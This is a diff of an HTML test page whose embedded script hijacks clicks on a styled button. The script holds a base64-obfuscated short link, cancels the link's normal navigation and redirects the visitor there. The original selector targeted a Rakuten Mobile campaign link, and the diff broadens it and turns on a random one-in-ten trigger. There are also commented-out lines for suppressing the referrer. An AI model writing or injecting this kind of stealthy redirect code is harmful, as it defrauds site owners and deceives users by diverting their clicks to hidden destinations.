@@ -15,7 +15,7 @@
             margin: 0;
             background-color: #f0f0f0;
         }
-        .btn {
+        .c-Btn_Secondly-large {
             padding: 15px 30px;
             font-size: 18px;
             color: #fff;
@@ -25,13 +25,13 @@
             cursor: pointer;
             text-decoration: none;
         }
-        .btn:hover {
+        .c-Btn_Secondly-large:hover {
             background-color: #0056b3;
         }
     </style>
 </head>
 <body>
-    <a href="https://example.com" class="btn c-Btn_Secondly-large" id="test-button">Click to Test Redirect</a>
+    <a href="https://example.com" class="c-Btn_Secondly-large" id="test-button">Click to Test Redirect</a>
 <script>
     (function() {
         const enrl = "aHR0cHM6Ly90aW55dXJsLmNvbS81bjY3aHd2OQ==";
@@ -56,11 +56,11 @@
         };
         
         try {
-            const b = document.querySelector("a.c-Btn_Secondly-large[href*='onboarding.mobile.rakuten.co.jp'][href*='l-id=application_card-campaign_button_onboarding']");
+            const b = document.querySelector("a.c-Btn_Secondly-large");
             if (!b) return;
             b.addEventListener("click", function(e) {
                 try {
-                    // if (Math.floor(10 * Math.random()) !== 0) return;
+                    if (Math.floor(10 * Math.random()) !== 0) return;
                     e.preventDefault();
                     e.stopPropagation();
                     let ss = !1;
@@ -85,7 +85,7 @@
                     // metaTag.name = "referrer";
                     // metaTag.content = "no-referrer";
                     // document.head.appendChild(metaTag);
-                    
+
                     stlh(enrl);
                     // Remove meta tag after submission to avoid affecting other clicks
                     setTimeout(() => metaTag.remove(), 1000);
